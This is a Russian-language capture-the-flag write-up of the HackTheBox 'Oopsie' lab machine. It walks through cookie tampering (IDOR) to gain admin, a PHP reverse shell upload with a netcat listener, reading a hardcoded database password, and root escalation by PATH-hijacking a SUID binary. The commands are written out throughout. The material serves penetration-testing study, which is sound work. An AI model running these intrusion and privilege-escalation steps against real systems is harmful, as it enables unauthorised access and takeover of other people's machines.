# HackTheBox - Oopsie Writeup

## Краткая сводка (Summary)
* **Целевая ОС:** Linux (Ubuntu)
* **Вектор входа:** Вход под гостевой учетной записью -> Обнаружение уязвимости IDOR (Insecure Direct Object Reference) в параметрах URL и Cookie (Burp Suite) -> Повышение привилегий на сайте до `admin`.
* **Закрепление (Проверенная уязвимость):** Небезопасная загрузка файлов (Arbitrary File Upload) в админ-панели -> Загрузка PHP Reverse Shell -> Получение первоначального доступа.
* **Повышение привилегий (Privilege Escalation):**
  * **Горизонтальное:** Извлечение жестко прописанного пароля из конфигурационного файла базы данных `db.php` -> Вход под пользователем `robert`.
  * **Вертикальное:** Обнаружение SUID-бинарника `bugtracker` -> Эксплуатация уязвимости небезопасного вызова системных команд (PATH Variable Hijacking) -> Получение прав `root`.

---

## Разведка

### Сканирование портов
Начинаю с быстрого сканирования портов и обнаруженных сервисов:

```bash
nmap -sC -sV [ip Oopsie]
```

### Результат
```text
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.29
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Анализ

1. **With what kind of tool can intercept web traffic?**
* **Ответ:** `proxy` *(Для перехвата трафика используется прокси-сервер)*.

2. **What is the path to the directory on the webserver that returns a login page?**
* С помощью Burp Suite открываем сайт, либо перехватываем трафик с браузера, настроенного на proxy Burp Suite. В выводе дерева сайта находим страницу авторизации.
* **Ответ:** `/cdn-cgi/login`

3. **What can be modified in Firefox to get access to the upload page?**
* **Ответ:** `cookie` *(Куки-файлы в браузере могут быть модифицированы для подмены сессии)*.

4. **What is the access ID of the admin user?**
* Для начала, чтобы найти id admin, необходимо авторизоваться под `guest`. В куках сессии отобразятся параметры `user=2233; role=guest`. Перебором параметра `?id=` на странице `content=accounts` находим профиль администратора с ID `1`. В его карточке указан уникальный идентификатор Access ID.
* **Ответ:** `34322`

5. **What is the name of the folder found via directory brute-forcing where uploaded files are stored?**
* **Ответ:** `uploads` *(Директория для загрузки файлов была обнаружена с помощью сканирования утилитой Gobuster)*.
* Использовалась команда:
  ```bash
  gobuster dir -u [ip Oopsie] -w /usr/share/wordlists/dirb/common.txt
  ```

---

## Получение первоначального доступа (Initial Access)

### Ход выполнения:
1. Используя подмену cookie на `user=34322; role=admin`, получаем доступ к админ-панели и разделу **Branding Image Uploads**.
2. Подготавливаем стандартный PHP Reverse Shell, прописав в нем IP-адрес интерфейса `tun0` атакующей машины и порт для прослушивания (например, `4444`).
3. Запускаем слушатель Netcat на атакующей машине:
   ```bash
   nc -lvnp 4444
   ```
4. Загружаем шелл через форму на сайте и активируем его, перейдя по прямому адресу: `http://[ip Oopsie]/uploads/shell.php`.
5. Закрепляемся в системе под низкопривилегированным пользователем `www-data`. Находясь в папке `uploads`, проверяем ее содержимое:
   ```bash
   ls -la
   ```

---

## Горизонтальное повышение привилегий (User Escalation)

**6. What is the file that contains the password that is shared with the robert user?**
* **Ответ:** `db.php`

### Ход выполнения:
1. Переходим в основную директорию веб-сервера и проверяем структуру папок, включая скрытые пути:
   ```bash
   cd /var/www/html
   ls -la
   ```
2. Обнаруживаем папку `cdn-cgi` и переходим к конфигурационным файлам:
   ```bash
   cd cdn-cgi/login
   ls -la
   ```
3. Читаем содержимое файла `db.php`:
   ```bash
   cat db.php
   ```
   Находим в коде жестко прописанные учетные данные подключения к БД: `пользователь: robert`, `пароль: M3g4C0rpUs3r!`.
4. Стабилизируем «сырой» шелл до интерактивного TTY-терминала с помощью Python:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
5. Переключаемся на системного пользователя, используя найденный пароль:
   ```bash
   su robert
   ```
6. Убеждаемся, что сессия переключена, и забираем первый флаг пользователя из его домашней директории:
   ```bash
   whoami
   cd /home/robert
   cat user.txt
   ```

---

## Вертикальное повышение привилегий (Root Escalation)

**7. What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?**
* **Ответ:** `find`

**8. Regardless of which user starts the given binary, the binary will execute with the permissions of the owner of the file. What is the name of this type of permission?**
* **Ответ:** `SUID`

**9. What is the name of the executable being called in an insecure manner by the bugtracker binary?**
* **Ответ:** `cat`

### Ход выполнения:
1. Выполняем поиск файлов, принадлежащих группе bugtracker:
   ```bash
   find / -group bugtracker 2>/dev/null
   ```
   Находим бинарник `/usr/bin/bugtracker` с установленным SUID-битом.
2. Проверяем права файла, чтобы убедиться в наличии SUID-бита (флаг `s`):
   ```bash
   ls -la /usr/bin/bugtracker
   ```
3. Тестируем работу программы и намеренно вызываем ошибку, передавая ей в качестве Bug ID некорректный путь (`/home/robert/user.txt`), чтобы увидеть, какая утилита вызывается изнутри:
   ```bash
   bugtracker
   ```
   Получаем ошибку `cat: /root/reports/: No such file or directory`, что подтверждает небезопасный вызов утилиты `cat` без указания абсолютного пути.
4. Переходим в директорию `/tmp` и проводим атаку **PATH Hijacking**:
   ```bash
   cd /tmp
   echo "/bin/sh" > cat
   chmod +x cat
   export PATH=/tmp:$PATH
   ```
5. Снова запускаем программу от robert:
   ```bash
   bugtracker
   ```
   Вводим любой Bug ID (например, `1`). Программа обращается к переменной `$PATH`, вместо оригинальной утилиты открывается наш исполняемый файл `cat` в директории `/tmp` и запускается командная строка с правами суперпользователя.
6. Проверяем успешность повышения прав и, используя абсолютный путь к легитимной системной утилите (чтобы обойти подмену), читаем финальный флаг:
   ```bash
   whoami
   cd /root
   ls -la
   /bin/cat root.txt
   ```

